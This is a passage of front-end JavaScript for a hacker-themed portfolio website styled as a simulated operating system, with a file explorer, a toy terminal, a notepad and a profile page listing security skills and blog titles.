                    windowElement.querySelector('.window-content').innerHTML = `<div class="p-4 text-red-500">Error: Path not found or is not a directory.</div>`;
                    return;
                }

                let filesHtml = '';
                const children = pathObject.children;
                // Sort folders first, then files
                const sortedKeys = Object.keys(children).sort((a, b) => {
                    const aIsFolder = children[a].type === 'folder';
                    const bIsFolder = children[b].type === 'folder';
                    if (aIsFolder && !bIsFolder) return -1;
                    if (!aIsFolder && bIsFolder) return 1;
                    return a.localeCompare(b);
                });

                for (const name of sortedKeys) {
                    const item = children[name];
                    const icon = item.type === 'folder' ? 'folder' : 'file-text';
                    filesHtml += `
                        <li class="p-1 flex items-center space-x-2 cursor-pointer hover:bg-green-900 rounded-sm" data-name="${name}" data-type="${item.type}">
                            <i data-lucide="${icon}" class="w-4 h-4 flex-shrink-0"></i>
                            <span>${name}</span>
                        </li>
                    `;
                }

                const parentPath = path.substring(0, path.lastIndexOf('/')) || '/';
                const isRoot = path === '/';

                windowElement.querySelector('.window-content').innerHTML = `
                    <div class="flex flex-col h-full">
                        <div class="p-2 flex items-center space-x-2 flex-shrink-0" style="background-color: var(--primary-color-darker); border-bottom: 1px solid var(--primary-color-dark);">
                            <button id="fs-back-btn" title="Up" ${isRoot ? 'disabled' : ''} data-path="${parentPath}" class="font-bold py-1 px-2 rounded-none transition-colors text-sm disabled:opacity-30 disabled:cursor-not-allowed" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">&#9650;</button>
                            <span class="text-sm truncate" style="color: var(--text-color-dim);">${path === '/' ? '/root' : path}</span>
                        </div>
                        <ul id="file-list" class="flex-grow p-2 space-y-1 text-sm overflow-y-auto" style="color: var(--text-color-dim);">
                            ${filesHtml || '<li class="p-2 text-gray-500 italic">This folder is empty.</li>'}
                        </ul>
                    </div>
                `;

                lucide.createIcons({ nodes: windowElement.querySelectorAll('[data-lucide]') });

                // Add event listeners
                windowElement.querySelector('#fs-back-btn').addEventListener('click', (e) => {
                    if (!e.currentTarget.disabled) {
                        renderExplorer(e.currentTarget.dataset.path);
                    }
                });

                windowElement.querySelector('#file-list').addEventListener('click', (e) => {
                    const target = e.target.closest('li');
                    if (!target) return;

                    const name = target.dataset.name;
                    const type = target.dataset.type;
                    const newPath = (path === '/' ? '' : path) + '/' + name;

                    if (type === 'folder') {
                        renderExplorer(newPath);
                    } else {
                        // Open file in notepad
                        openApp('notes');
                        // Use a timeout to ensure the app is open before we populate it
                        setTimeout(() => {
                            const notesWindow = WindowManager.openWindows['notes'];
                            if (notesWindow) {
                                const textarea = notesWindow.querySelector('textarea');
                                const fileName = newPath.split('/').pop();
                                textarea.value = getPathObject(newPath).content;
                                textarea.dataset.currentPath = newPath; // Store the path
                                notesWindow.querySelector('.title-bar span').textContent = `Notepad - ${fileName}`;
                                focusWindow(notesWindow);
                            }
                        }, 100);
                    }
                });
            };

            renderExplorer('/'); // Start at the root
        }

        // --- NEW APP: TERMINAL ---
        function initializeTerminalWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div id="terminal-output" class="p-2 h-full overflow-y-auto text-sm font-mono whitespace-pre-wrap"></div>
                <div class="flex items-center p-1 flex-shrink-0" style="background-color: var(--primary-color-darker); border-top: 1px solid var(--primary-color-dark);">
                    <span class="pl-2" style="color: var(--primary-color);">devdebug@os:~$</span>
                    <input type="text" id="terminal-input" class="flex-grow p-1 bg-transparent focus:outline-none text-sm" style="color: var(--primary-color);" autocomplete="off" />
                </div>
            `;

            const outputEl = windowElement.querySelector('#terminal-output');
            const inputEl = windowElement.querySelector('#terminal-input');
            let commandHistory = [];
            let historyIndex = -1;
            let cwd = '/'; // Current Working Directory for the terminal

            const printToTerminal = (text, isCommand = false) => {
                if (isCommand) {
                    outputEl.innerHTML += `<span style="color: var(--primary-color);">devdebug@os:~$</span> <span style="color: var(--text-color-dim);">${text}</span>\n`;
                } else {
                    outputEl.innerHTML += text + '\n';
                }
                outputEl.scrollTop = outputEl.scrollHeight;
            };
            
            // Helper to navigate the file system for terminal commands
            const getPathObject = (path, currentDir) => {
                if (!path.startsWith('/')) {
                    path = (currentDir === '/' ? '' : currentDir) + '/' + path;
                }
                const parts = path.split('/').filter(p => p);
                let current = fileSystem.root;
                for (const part of parts) {
                    if (part === '..') {
                        // This is a simplified '..' handler. A real one is more complex.
                        // For now, we just go up one level from the absolute path.
                        const parentPath = path.substring(0, path.lastIndexOf('/')) || '/';
                        return getPathObject(parentPath, '/');
                    }
                    if (current && current.type === 'folder' && current.children[part]) {
                        current = current.children[part];
                    } else { return null; }
                }
                return current;
            };

            const commands = {
                help: () => {
                    return `Available commands:\n` +
                           `  <span style="color: var(--accent-color);">help</span>         - Shows this help message.\n` +
                           `  <span style="color: var(--accent-color);">ls</span>           - Lists items on the desktop.\n` +
                           `  <span style="color: var(--accent-color);">ps</span>           - Lists active processes.\n` +
                           `  <span style="color: var(--accent-color);">open [app_id]</span>  - Opens an application (e.g., 'open browser').\n` +
                           `  <span style="color: var(--accent-color);">kill [app_id]</span>  - Terminates a running application (e.g., 'kill browser').\n` +
                           `  <span style="color: var(--accent-color);">clear</span>        - Clears the terminal screen.\n` +
                           `  <span style="color: var(--accent-color);">echo [text]</span>    - Prints text to the terminal.\n` +
                           `  <span style="color: var(--accent-color);">date</span>         - Displays the current date and time.\n` +
                           `  <span style="color: var(--accent-color);">neofetch</span>     - Shows system information.\n` +
                           `  <span style="color: var(--accent-color);">devdebug</span>     - Displays the OS logo.\n` +
                           `  <span style="color: var(--accent-color);">matrix</span>       - Enter the matrix.`;
                },
                ls: (args) => {
                    let path = args[0] || '.';
                    // If path is '.', use the current working directory directly.
                    // Otherwise, resolve the given path.
                    const targetDir = (path === '.') ? getPathObject(cwd, '/') : getPathObject(path, cwd);

                    if (!targetDir || targetDir.type !== 'folder') {
                        return `ls: cannot access '${path}': No such file or directory`;
                    }
                    const children = Object.keys(targetDir.children);
                    if (children.length === 0) return '';

                    return children.map(name => {
                        const color = targetDir.children[name].type === 'folder' ? 'var(--accent-color)' : 'var(--primary-color)';
                        return `<span style="color: ${color};">${name}</span>`;
                    }).join('\n');
                },
                cd: (args) => {
                    const targetPath = args[0] || '/';
                    const targetDir = getPathObject(targetPath, cwd);
                    if (!targetDir || targetDir.type !== 'folder') {
                        return `cd: no such file or directory: ${targetPath}`;
                    }
                    // Normalize the new path
                    let newCwd = (cwd === '/' ? '' : cwd) + '/' + targetPath;
                    if (targetPath.startsWith('/')) newCwd = targetPath;
                    // Basic '..' handling
                    newCwd = newCwd.replace(/\/[^/]+\/\.\./g, '') || '/';
                    cwd = newCwd;
                    // Update the prompt visually (optional but cool)
                    windowElement.querySelector('.flex-shrink-0 > span').textContent = `devdebug@os:~${cwd}$`;
                    return '';
                },
                cat: (args) => {
                    const filePath = args[0];
                    if (!filePath) return "Usage: cat [file_path]";
                    const fileObject = getPathObject(filePath, cwd);
                    if (!fileObject || fileObject.type !== 'file') return `cat: ${filePath}: No such file or directory`;
                    return fileObject.content;
                },
                ps: () => {
                    let output = '<span style="color: var(--text-color-dim);">PROCESS\t\t\t\t\t\tCPU\t\tMEM</span>\n';
                    output += '----------------------------------------------\n';
                    const openApps = Object.keys(WindowManager.openWindows);
                    if (openApps.length === 0) {
                        return "No active processes.";
                    }
                    openApps.forEach(appId => {
                        const cpu = (Math.random() * (appId === 'snake' || appId === 'terminal-tennis' ? 15 : 5)).toFixed(2).padStart(6, ' ');
                        const mem = (Math.random() * 100 + 50).toFixed(1).padStart(6, ' ');
                        output += `${appId.padEnd(24, ' ')}${cpu}%\t${mem}MB\n`;
                    });
                    return output;
                },
                open: (args) => {
                    const appId = args[0];
                    if (!appId) return "Usage: open [app_id]";
                    if (apps[appId]) {
                        openApp(appId);
                        return `Executing: ${appId}...`;
                    }
                    return `Error: Application '${appId}' not found.`;
                },
                kill: (args) => {
                    const appId = args[0];
                    if (!appId) return "Usage: kill [app_id]";
                    if (appId === 'terminal') return "Error: Cannot terminate the terminal from within itself.";
                    if (WindowManager.openWindows[appId]) {
                        closeApp(appId);
                        return `Process '${appId}' terminated.`;
                    }
                    return `Error: Process '${appId}' not found or not running.`;
                },
                clear: () => {
                    outputEl.innerHTML = '';
                    return ''; // No output
                },
                echo: (args) => {
                    const message = args.join(' ') || "...";
                    const botArt = 
`   \\  
    \\  
      |\\__/,|   (\`\\
      |_ _  |.--.) )
      ( T   )     /
    (((^_(((/(((_/                
                    `;
                    return `<span style="color: var(--accent-color);"> &lt; ${message} &gt;</span>\n` + botArt;
                },
                date: () => {
                    return new Date().toLocaleString();
                },
                neofetch: () => {
                    const primaryColor = getComputedStyle(document.documentElement).getPropertyValue('--primary-color').trim();
                    return `
<span style="color: var(--text-color-dim);">devdebug@os</span>
-------------------
<span style="color: var(--text-color-dim);">OS:</span> DEVDEBUG OS v1.0
<span style="color: var(--text-color-dim);">Kernel:</span> 5.4.0-generic-js
<span style="color: var(--text-color-dim);">Uptime:</span> ${new Date(new Date() - window.osStartTime).toISOString().substr(11, 8)}
<span style="color: var(--text-color-dim);">Shell:</span> term.js
<span style="color: var(--text-color-dim);">Resolution:</span> ${window.innerWidth}x${window.innerHeight}
<span style="color: var(--text-color-dim);">Theme:</span> [Current]
<span style="color: var(--text-color-dim);">CPU:</span> Ryzen 5 (Simulated)
<span style="color: var(--text-color-dim);">GPU:</span> NVIDIA RTX 5060 Ti (Sim)`;
                },
                devdebug: () => {
                    const primaryColor = getComputedStyle(document.documentElement).getPropertyValue('--primary-color').trim();
                    const textColorDim = getComputedStyle(document.documentElement).getPropertyValue('--text-color-dim').trim();
                    const logo = `

                    
 ██████╗ ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗   ██╗ ██████╗  
 ██╔══██╗██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝  
 ██║  ██║█████╗  ██║   ██║██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗ 
 ██║  ██║██╔══╝  ╚██╗ ██╔╝██║  ██║██╔══╝  ██╔══██╗██║   ██║██║   ██║ 
 ██████╔╝███████╗ ╚████╔╝ ██████╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝ 
 ╚═════╝ ╚══════╝  ╚═══╝  ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝  
 ------------------------------------ Made with ♥ by Debmalya Mondal           
                    
                    `;
                    return `<pre style="line-height: 1.2;">${logo}</pre>`;
                },
                matrix: () => {
                    // This command is special and is handled by the executeCommand function
                    // It returns a string that will be briefly visible.
                    return 'INITIALIZING MATRIX...';
                }
            };

            const executeCommand = (commandStr) => {
                printToTerminal(commandStr, true);
                commandHistory.unshift(commandStr);
                historyIndex = -1;

                const parts = commandStr.trim().split(/\s+/);
                const command = parts[0].toLowerCase();
                const args = parts.slice(1);

                if (command === 'matrix') {
                    startMatrixAnimation(args);
                    return; // Prevent further processing
                }

                if (commands[command]) {
                    const result = commands[command](args);
                    if (result) printToTerminal(result);
                } else if (command) {
                    printToTerminal(`Command not found: ${command}. Type 'help' for a list of commands.`);
                }
            };

            const startMatrixAnimation = (args) => {
                const inputContainer = windowElement.querySelector('.flex-shrink-0');
                inputContainer.style.display = 'none'; // Hide the input prompt

                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');

                // Set canvas size to fill the container
                canvas.width = outputEl.clientWidth;
                canvas.height = outputEl.clientHeight;

                // Animation properties
                const primaryColor = getComputedStyle(document.documentElement).getPropertyValue('--primary-color').trim();
                const bgColor = 'rgba(0, 0, 0, 0.05)';
                const fontSize = 16;
                const columns = canvas.width / fontSize;

                const charSets = {
                    mixed: 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン0123456789', // Katakana set
                    english: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()',
                    bengali: 'অআইঈউঊঋঌএঐওঔকখগঘঙচছজঝঞটঠডঢণতথদধনপফবভমযরলশষসহংঃঽািীুূৃৄেৈোৌ্ৎ',
                };

                let chars;
                const mode = args[0] ? args[0].toLowerCase() : 'mixed';

                if (mode === 'e' || mode === 'english') {
                    chars = charSets.english;
                } else if (mode === 'b' || mode === 'bengali') {
                    chars = charSets.bengali;
                } else {
                    chars = charSets.mixed;
                }

                const drops = [];
                for (let x = 0; x < columns; x++) {
                    drops[x] = 1;
                }

                let animationFrameId;

                function draw() {
                    ctx.fillStyle = bgColor;
                    ctx.fillRect(0, 0, canvas.width, canvas.height);

                    ctx.fillStyle = primaryColor;
                    ctx.font = `${fontSize}px monospace`;

                    for (let i = 0; i < drops.length; i++) {
                        const text = chars[Math.floor(Math.random() * chars.length)];
                        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                            drops[i] = 0;
                        }
                        drops[i]++;
                    }
                    animationFrameId = requestAnimationFrame(draw);
                }

                const stopMatrixAnimation = () => {
                    cancelAnimationFrame(animationFrameId);
                    canvas.remove();
                    inputContainer.style.display = 'flex'; // Show the input prompt again
                    printToTerminal("Matrix sequence terminated.");
                    inputEl.focus();
                    // Remove listeners to prevent memory leaks
                    document.removeEventListener('keydown', stopMatrixAnimation);
                    windowElement.removeEventListener('click', stopMatrixAnimation);
                };

                // Add listeners to stop the animation
                document.addEventListener('keydown', stopMatrixAnimation, { once: true });
                windowElement.addEventListener('click', stopMatrixAnimation, { once: true });

                printToTerminal("Entering the Matrix... Press any key or click to exit.");
                setTimeout(() => {
                    outputEl.innerHTML = ''; // Clear message
                    outputEl.appendChild(canvas);
                    draw();
                }, 1000);
            };

            inputEl.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    executeCommand(inputEl.value);
                    inputEl.value = '';
                } else if (e.key === 'ArrowUp') {
                    if (historyIndex < commandHistory.length - 1) {
                        historyIndex++;
                        inputEl.value = commandHistory[historyIndex];
                    }
                } else if (e.key === 'ArrowDown') {
                    if (historyIndex > 0) {
                        historyIndex--;
                        inputEl.value = commandHistory[historyIndex];
                    } else {
                        historyIndex = -1;
                        inputEl.value = '';
                    }
                }
            });

            // Focus the input when the window is clicked
            windowElement.addEventListener('click', () => inputEl.focus());
            inputEl.focus();

            printToTerminal("DEVDEBUG OS [Isolated Environment]\n(c) DevDebug Corporation. All rights reserved.\n\nType 'help' for a list of available commands.");
        }

        // --- NEW: NOTES APP WITH SAVE/NEW ---
        function initializeNotesWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex flex-col h-full">
                    <!-- Toolbar -->
                    <div class="flex-shrink-0 p-1 flex items-center space-x-1" style="background-color: var(--primary-color-darker); border-bottom: 1px solid var(--primary-color-dark);">
                        <button id="notes-new-btn" title="New File" class="px-2 py-1 text-xs hover:bg-gray-700 rounded-sm flex items-center space-x-1"><i data-lucide="file-plus-2" class="w-4 h-4"></i><span>New</span></button>
                        <button id="notes-save-btn" title="Save File" class="px-2 py-1 text-xs hover:bg-gray-700 rounded-sm flex items-center space-x-1"><i data-lucide="save" class="w-4 h-4"></i><span>Save</span></button>
                    </div>
                    <!-- Text Area -->
                    <textarea id="notes-textarea" class="w-full h-full p-3 bg-black text-sm resize-none focus:outline-none" style="color: var(--text-color-dim);"
                        placeholder="File > New to start, or open a file from the File Explorer."></textarea>
                </div>
            `;

            const textarea = windowElement.querySelector('#notes-textarea');
            const newBtn = windowElement.querySelector('#notes-new-btn');
            const saveBtn = windowElement.querySelector('#notes-save-btn');

            lucide.createIcons({ nodes: windowElement.querySelectorAll('[data-lucide]') });

            // New File
            newBtn.addEventListener('click', () => {
                textarea.value = '';
                textarea.dataset.currentPath = ''; // Clear current path
                windowElement.querySelector('.title-bar span').textContent = 'Notepad - Untitled';
                textarea.placeholder = "Type something...";
                textarea.focus();
            });

            // Save File
            saveBtn.addEventListener('click', () => {
                let path = textarea.dataset.currentPath;
                const content = textarea.value;

                if (path) { // If a file is already open, save it
                    const pathParts = path.split('/').filter(p => p);
                    const fileName = pathParts.pop();
                    let current = fileSystem.root;
                    for (const part of pathParts) {
                        current = current.children[part];
                    }
                    if (current && current.children[fileName]) {
                        current.children[fileName].content = content;
                        // Visual feedback (e.g., flash title) could be added here
                    } else {
                        alert('Error: Could not find file path to save.');
                    }
                } else { // If it's a new file, prompt for a name and save
                    showSaveAsDialog(windowElement, content);
                }
            });
        }

        // --- NEW: DEVDEBUG PROFILE APP ---
        function initializeDevDebugWindow(windowElement) {
            windowElement.querySelector('.window-content').innerHTML = `
                <div class="flex h-full text-sm">
                    <!-- Left Sidebar -->
                    <div class="w-1/3 flex-shrink-0 flex flex-col p-4 space-y-4" style="background-color: var(--primary-color-darker);">
                        <!-- Profile Header -->
                        <div class="text-center">
                            <div class="w-24 h-24 mx-auto mb-3 flex items-center justify-center rounded-full" style="border: 3px solid var(--primary-color); background-color: #000;">
                                <img src="me.png" alt="DevDebug Avatar" class="w-24 h-24 rounded-full">
                            </div>
                            <h2 class="text-xl font-bold">DevDebug</h2>
                            <p class="text-xs" style="color: var(--text-color-dim);">Cybersecurity / UX Research</p>
                        </div>

                        <!-- Vertical Tab Navigation -->
                        <div id="devdebug-tabs" class="flex-grow flex flex-col space-y-1">
                            <button class="devdebug-tab-btn active" data-tab="about"><i data-lucide="user-round" class="w-4 h-4 mr-2"></i><span>About</span></button>
                            <button class="devdebug-tab-btn" data-tab="skills"><i data-lucide="wrench" class="w-4 h-4 mr-2"></i><span>Skills</span></button>
                            <button class="devdebug-tab-btn" data-tab="blog"><i data-lucide="rss" class="w-4 h-4 mr-2"></i><span>Blog</span></button>
                            <button class="devdebug-tab-btn" data-tab="contact"><i data-lucide="mail" class="w-4 h-4 mr-2"></i><span>Contact</span></button>
                        </div>
                    </div>

                    <!-- Right Content Panel -->
                    <div class="w-2/3 flex-grow p-6 overflow-y-auto" style="color: var(--text-color-dim); border-left: 1px solid var(--primary-color-dark);">
                        <div id="devdebug-tab-about" class="devdebug-tab-content space-y-4">
                            <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">[ About Me ]</h3>
                            <div class="p-4 space-y-3" style="background-color: var(--primary-color-darker); border-left: 3px solid var(--primary-color);">
                                <p class="leading-relaxed">I am a ghost in the machine, a digital phantom navigating the complex arteries of cyberspace. My expertise lies in reverse-engineering proprietary systems, kernel-level exploitation, and building secure, untraceable communication networks.</p>
                                <p class="leading-relaxed">This OS is my sanctuary and my workshop—a testament to the idea that true freedom is found in the ones and zeros you control.</p>
                            </div>
                        </div>
                        <div id="devdebug-tab-skills" class="devdebug-tab-content hidden space-y-4">
                            <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">[ Skillset ]</h3>
                            <!-- Core Competencies -->
                            <div class="p-4" style="background-color: var(--primary-color-darker); border-left: 3px solid var(--primary-color);">
                                <h4 class="font-bold mb-3" style="color: var(--text-color-dim);">Core Competencies</h4>
                                <ul class="list-disc list-inside space-y-2">
                                    <li>System Kernel & Driver Exploitation</li>
                                    <li>Advanced Network Traffic Analysis & Anomaly Detection</li>
                                    <li>Cryptography, Steganography & Covert Channels</li>
                                    <li>Social Engineering & Digital Infiltration Tactics</li>
                                    <li>Firmware Reverse Engineering (x86/ARM)</li>
                                </ul>
                            </div>
                            <!-- Tech Stacks -->
                            <div class="p-4" style="background-color: var(--primary-color-darker); border-left: 3px solid var(--primary-color);">
                                <div class="flex justify-between items-center mb-4">
                                    <h4 class="font-bold" style="color: var(--text-color-dim);">Tools & Tech Stacks</h4>
                                    <div id="skill-toggle-btns" class="flex text-xs border rounded-md" style="border-color: var(--primary-color-dark);">
                                        <button class="skill-toggle-btn active px-3 py-1" data-grid="tech-skills-grid">Tech</button>
                                        <button class="skill-toggle-btn px-3 py-1" data-grid="creative-skills-grid">Creative</button>
                                    </div>
                                </div>
                                <!-- Tech Grid -->
                                <div id="tech-skills-grid" class="skills-grid grid grid-cols-3 sm:grid-cols-4 gap-2 text-center">
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/html-5--v1.png" alt="HTML5" class="h-10 w-10"><span class="block text-xs mt-1">HTML5</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/css3.png" alt="CSS3" class="h-10 w-10"><span class="block text-xs mt-1">CSS3</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/javascript--v1.png" alt="JavaScript" class="h-10 w-10"><span class="block text-xs mt-1">JavaScript</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/plasticine/100/react.png" alt="React" class="h-10 w-10"><span class="block text-xs mt-1">React</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/nextjs.png" alt="Next.js" class="h-10 w-10"><span class="block text-xs mt-1">Next.js</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/tailwind_css.png" alt="Tailwind CSS" class="h-10 w-10"><span class="block text-xs mt-1">Tailwind</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/java-coffee-cup-logo--v1.png" alt="Java" class="h-10 w-10"><span class="block text-xs mt-1">Java</span></div>
                                </div>
                                <!-- Creative Grid -->
                                <div id="creative-skills-grid" class="skills-grid hidden grid grid-cols-3 sm:grid-cols-4 gap-2 text-center">
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/figma--v1.png" alt="Figma" class="h-10 w-10"><span class="block text-xs mt-1">Figma</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/framer.png" alt="Framer" class="h-10 w-10"><span class="block text-xs mt-1">Framer</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/adobe-photoshop--v1.png" alt="Photoshop" class="h-10 w-10"><span class="block text-xs mt-1">Photoshop</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/adobe-illustrator--v1.png" alt="Illustrator" class="h-10 w-10"><span class="block text-xs mt-1">Illustrator</span></div>
                                    <div class="skill-item p-3 flex flex-col items-center justify-center" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="https://img.icons8.com/color/48/spline.png" alt="Spline" class="h-10 w-10"><span class="block text-xs mt-1">Spline</span></div>
                                </div>
                            </div>
                        </div>
                        <div id="devdebug-tab-blog" class="devdebug-tab-content hidden space-y-4">
                            <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">[ Blogs ]</h3>
                            <!-- Blog Post 1 -->
                            <div class="p-4 flex justify-between items-center" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);">
                                <div>
                                    <h4 class="font-bold" style="color: var(--text-color-dim);">Analyzing the E-Corp Kernel Panic Vulnerability</h4>
                                    <p class="text-xs opacity-70">A deep dive into a critical system flaw.</p>
                                </div>
                                <button class="blog-link text-xs px-3 py-1" data-url="https://medium.com/p/1">View</button>
                            </div>
                            <!-- Blog Post 2 -->
                            <div class="p-4 flex justify-between items-center" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);">
                                <div>
                                    <h4 class="font-bold" style="color: var(--text-color-dim);">Bypassing Corporate Firewalls with DNS Tunneling</h4>
                                    <p class="text-xs opacity-70">Exfiltrating data through overlooked protocols.</p>
                                </div>
                                <button class="blog-link text-xs px-3 py-1" data-url="https://medium.com/p/2">View</button>
                            </div>
                            <!-- Blog Post 3 -->
                            <div class="p-4 flex justify-between items-center" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);">
                                <div>
                                    <h4 class="font-bold" style="color: var(--text-color-dim);">The Illusion of Privacy in the Age of Big Data</h4>
                                    <p class="text-xs opacity-70">How your digital footprint is being monetized.</p>
                                </div>
                                <button class="blog-link text-xs px-3 py-1" data-url="https://medium.com/p/3">View</button>
                            </div>
                        </div>
                        <div id="devdebug-tab-contact" class="devdebug-tab-content hidden space-y-4">
                            <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">[ Contact Me ]</h3>
                            <div class="p-4" style="background-color: var(--primary-color-darker); border-left: 3px solid var(--primary-color);">
                                <p class="leading-relaxed mb-3">For encrypted communications, use the following channel. Public keys available upon authenticated request.</p>
                                <a href="mailto:devdebug@example.com" class="font-mono p-2 inline-block" style="color: var(--accent-color); background-color: #000;">contact@devdebug.in</a>
                            </div>
                        </div>
                    </div>
                </div>
            `;

            // Tab switching logic
            const tabs = windowElement.querySelectorAll('.devdebug-tab-btn');
            const contents = windowElement.querySelectorAll('.devdebug-tab-content');
            tabs.forEach(tab => {
                tab.addEventListener('click', () => {
                    tabs.forEach(t => t.classList.remove('active'));
                    tab.classList.add('active');

                    contents.forEach(c => c.classList.add('hidden'));
                    windowElement.querySelector(`#devdebug-tab-${tab.dataset.tab}`).classList.remove('hidden');
                });
            });

            // --- NEW: Skill toggle logic ---
            const skillToggleContainer = windowElement.querySelector('#skill-toggle-btns');
            if (skillToggleContainer) {
                const toggleBtns = skillToggleContainer.querySelectorAll('.skill-toggle-btn');
                const skillGrids = windowElement.querySelectorAll('.skills-grid');
                toggleBtns.forEach(btn => {
                    btn.addEventListener('click', () => {
                        toggleBtns.forEach(b => b.classList.remove('active'));
                        btn.classList.add('active');
                        skillGrids.forEach(grid => grid.classList.add('hidden'));
                        windowElement.querySelector(`#${btn.dataset.grid}`).classList.remove('hidden');
                    });
                });
            }

            lucide.createIcons({ nodes: windowElement.querySelectorAll('[data-lucide]') });

            // Blog link logic
            windowElement.querySelectorAll('.blog-link').forEach(link => {
                link.addEventListener('click', (e) => {
                    e.preventDefault();
                    const url = e.target.dataset.url;
                    openApp('browser');
                    setTimeout(() => {
                        const browserWindow = WindowManager.openWindows['browser'];
                        if (browserWindow) {
                            browserWindow.querySelector('#browser-url').value = url;
                            navigateOrSearch(browserWindow, url, false);
                            focusWindow(browserWindow);
                        }
                    }, 100);
                });
            });

            // Add styling for the new layout
            const style = document.createElement('style');
            style.innerHTML = `
                .devdebug-tab-btn { display: flex; align-items: center; space-x: 3; width: 100%; text-align: left; padding: 0.75rem 1rem; border-radius: 0.25rem; transition: background-color 0.2s, color 0.2s; border-left: 3px solid transparent; }
                .devdebug-tab-btn:hover { background-color: rgba(255,255,255,0.05); }
                .devdebug-tab-btn.active { background-color: var(--primary-color-dark); color: var(--primary-color); font-weight: bold; border-left-color: var(--primary-color); }
                .blog-link { background-color: var(--primary-color); color: black; font-weight: bold; transition: opacity 0.2s; }
                .blog-link:hover { opacity: 0.8; }
                .skill-toggle-btn { transition: background-color 0.2s; }
                .skill-toggle-btn.active { background-color: var(--primary-color); color: black; font-weight: bold; }
                .skill-item { border-radius: 0.25rem; transition: transform 0.2s ease-in-out, border-color 0.2s ease-in-out; }
                .skill-item:hover { 
                    transform: scale(1.05);
                    border-color: var(--primary-color);
                    box-shadow: 0 0 5px var(--primary-color-glow);
                }
            `;
            windowElement.appendChild(style);
        }

        /**
         * NEW: Shows a custom "Save As" dialog for the Notepad app.
         * @param {HTMLElement} notesWindowElement - The parent Notepad window element.
         * @param {string} contentToSave - The text content to be saved.
         */
        function showSaveAsDialog(notesWindowElement, contentToSave) {
            // Create a unique ID for the dialog to prevent conflicts
            const dialogId = `save-dialog-${Date.now()}`;
            const dialog = document.createElement('div');
            dialog.id = dialogId;
            dialog.className = 'window p-0'; // Use the same base class as other windows
            dialog.style.width = '350px';
            dialog.style.height = '200px';
            dialog.style.top = '30vh';
            dialog.style.left = 'calc(50vw - 175px)'; // Center it
            focusWindow(dialog); // Bring it to the front

            dialog.innerHTML = `
                <div class="title-bar p-2 flex items-center justify-between text-sm font-semibold">
                    <span>Save As</span>
                    <button class="close-btn w-6 h-6 rounded-none flex items-center justify-center">X</button>
                </div>
                <div class="window-content p-4 flex flex-col justify-between">
                    <div class="space-y-2">
                        <label for="save-filename" class="text-sm" style="color: var(--text-color-dim);">File name:</label>
                        <input type="text" id="save-filename" value="new_note.txt" class="w-full p-2 bg-black text-sm focus:outline-none focus:ring-1" style="color: var(--primary-color); border: 1px solid var(--primary-color-dark); --ring-color: var(--primary-color);">
                        <p class="text-xs" style="color: var(--text-color-dim);">Save in: /users/DevDebug/</p>
                    </div>
                    <div class="flex justify-end space-x-2">
                        <button id="save-cancel-btn" class="px-4 py-1 text-sm" style="background-color: var(--primary-color-dark);">Cancel</button>
                        <button id="save-confirm-btn" class="px-4 py-1 text-sm text-black font-bold" style="background-color: var(--primary-color);">Save</button>
                    </div>
                </div>
            `;

            WindowManager.desktop.appendChild(dialog);

            const closeDialog = () => dialog.remove();

            dialog.querySelector('.close-btn').addEventListener('click', closeDialog);
            dialog.querySelector('#save-cancel-btn').addEventListener('click', closeDialog);

            dialog.querySelector('#save-confirm-btn').addEventListener('click', () => {
                const fileName = dialog.querySelector('#save-filename').value.trim();
                if (fileName) {
